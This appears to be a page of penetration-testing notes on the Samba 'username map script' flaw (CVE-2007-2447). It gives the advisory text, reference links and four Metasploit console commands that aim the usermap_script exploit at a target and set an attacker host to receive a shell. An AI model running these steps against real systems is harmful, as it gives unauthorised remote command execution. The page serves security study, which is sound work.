<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Username Map Script (CVE-2007-2447)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Username Map Script (CVE-2007-2447)</h1><br /><a
      href="http://cve.circl.lu/cve/CVE-2007-2447">CVE-2007-2447</a> (referred as <span
      style="text-decoration:underline;">Username Map Script</span>)<br /><br />Samba since version 3.0.20 and before
    3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1)
    SamrChangePassword function, when the &quot;username map script&quot; smb.conf option is enabled, and allows remote
    authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote
    printer and (3) file share management.<br /> ◇ <span style="text-decoration:underline;">Samba.org explanation of the
      vulnerability</span>: <a
      href="https://www.samba.org/samba/security/CVE-2007-2447.html" target="_blank">https://www.samba.org/samba/security/CVE-2007-2447.html</a><br /><br /><span
      style="text-decoration:underline;">Metasploit module</span>: <a
      href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script" target="_blank">https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script</a><br />
    <div class="codebox">
      <div class="codebox">
        msf&gt;&nbsp;use&nbsp;exploit/multi/samba/usermap_script<br />msf&gt;&nbsp;set&nbsp;RHOST&nbsp;&lt;targetIp&gt;<br />msf&gt;&nbsp;set&nbsp;LHOST&nbsp;&lt;attackerIp&gt;<br />msf&gt;&nbsp;exploit
      </div>
    </div><br /> if we have not get an interactive shell, we can get one. See the chapter “shell on the linux machine”
  </div>
</body>

</html>